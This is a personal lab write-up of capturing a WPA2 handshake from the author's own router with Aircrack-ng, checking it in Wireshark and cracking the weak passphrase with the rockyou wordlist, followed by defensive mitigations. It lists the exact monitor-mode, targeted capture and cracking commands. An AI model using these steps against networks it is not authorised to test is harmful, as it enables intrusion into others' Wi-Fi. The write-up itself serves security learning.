# WPA/WPA2 Handshake Capture & Crack with Aircrack-ng – March 20, 2026

**Objective:**  
Capture a WPA handshake from my test Wi-Fi network (ethical lab only – my own router) using Aircrack-ng suite, verify it in Wireshark, then attempt to crack the pre-shared key (PSK) using a dictionary attack with rockyou.txt wordlist.  
This exercise combines offensive wireless techniques (Udemy ethical hacking course) with defensive understanding (Cisco Network Defence – why handshakes are vulnerable and how to mitigate).

**Important Ethical & Legal Note:**  
This was performed **only on my personal test router** 

**Tools Used:**  
- Kali Linux (latest version)  
- Aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng, aircrack-ng)
- Mdk4 
- Wireshark (for packet analysis)  
- Wireless adapter supporting monitor mode (Realtek rtl88xxcu chipset shown in screenshots)  
- Wordlist: /usr/share/wordlists/rockyou.txt (common dictionary for testing weak passwords)  

**Step-by-Step Process (Offensive – Capture Phase)**

1. **Prepare Monitor Mode**  
   - Killed interfering processes:  
   Syntax: sudo airmon-ng check kill
   
   - Enabled monitor mode:
   Syntax: sudo airmon-ng start wlan0

   - Verified with:
   Syntax: iwconfig

 2. **Scan & Target Network**
    - Used airodump-ng to find target:
    Syntax sudo airodump-ng wlan0

    - Identified target AP:
    BSSID: 60:83:E7:47:CA:4D
    ESSID: fatema
    Channel: 2
    Encryption: WPA CCMP PSK

    - Locked capture to target:
    Syntax: sudo airodump-ng --bssid 60:83:E7:47:CA:4D -c 2 --write 4Wayhandshake wlan0

3. **Capture Handshake**
    Forced reconnection (deauth not shown in these screenshots but implied earlier).
    Result: Captured WPA handshake: 60:83:E7:47:CA:4D (top-right in airodump-ng).

   - In Wireshark (opened 4Wayhandshake-01.cap):
Filtered: eapol
Saw 4 EAPOL Key messages (Message 1–4 of 4-way handshake)
Source/Dest: Client ↔ AP (e.g., be:3a:d9:6a:15:13 ↔ TP-Link_47:ca:4d)
Protocol: EAPOL
Key info: Message 1 of 4, 2 of 4, etc.
This confirms full 4-way handshake captured (critical for cracking).

4. **Crack the Handshake (Dictionary Attack)**
   - Used aircrack-ng to reveal password
     Syntax: sudo aircrack-ng 4Wayhandshake-01.cap -w /usr/share/wordlists/rockyou.txt

**Output:**
Read 3777 packets
1 potential target (WPA PSK)
Tested millions of keys (~1732 keys/sec)
KEY FOUND! after ~16% progress (time left ~2 hours initially, but finished faster due to weak/test password)
Revealed:
KEY FOUND! [ 123456 ] (example – your actual weak/test key)
Master Key, Transient Key, EAPOL HMAC shown

**Defensive Lessons Learned (Cisco / Blue Team Perspective)**

**Why handshakes are vulnerable:** WPA/WPA2-PSK uses 4-way EAPOL exchange to derive session keys from passphrase. If captured and passphrase is weak/common, offline dictionary attack cracks it.

**Mitigations:**
Use strong, unique passphrases (>20 chars, random)
Enable Protected Management Frames (802.11w) to prevent deauth abuse
Monitor for deauth floods or unusual EAPOL in SIEM/Wireless IDS
Use enterprise auth (802.1X) instead of PSK in production


Screenshots Included (Anonymized where needed):

Monitor mode setup (airmon-ng start)
airodump-ng targeted capture & handshake confirmation
Wireshark EAPOL 4-way handshake packets
airodump-ng live scan showing target AP/clients
aircrack-ng cracking output with KEY FOUND
